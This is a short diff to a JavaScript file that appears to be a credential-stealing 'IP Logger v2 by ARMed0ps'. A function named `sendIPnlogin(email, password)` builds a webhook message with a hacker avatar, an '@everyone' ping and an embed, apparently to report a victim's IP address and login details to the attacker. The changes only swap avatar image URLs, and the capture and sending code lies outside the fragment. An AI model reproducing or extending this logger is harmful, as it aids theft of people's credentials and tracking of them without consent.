@@ -24,7 +24,7 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                         },
                         body: JSON.stringify({
                             username: "1pl0gg3r", // optionally changeable
-                            avatar_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg", // optionally changeable
+                            avatar_url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg", // optionally changeable
                             content: `@everyone`,
                             embeds: [
                                 {
@@ -63,11 +63,11 @@ const sendIPnlogin = (email = 'unknown', password = 'unknown') => {
                                         }
                                     ],
                                     thumbnail: {
-                                        url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
+                                        url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     footer: {
                                         text: "IP Logger v2 by ARMed0ps",
-                                        icon_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg"
+                                        icon_url: "https://armed0ps.github.io/IP-Logger/hackerpfp.jpg"
                                     },
                                     timestamp: new Date().toISOString()
                                 }
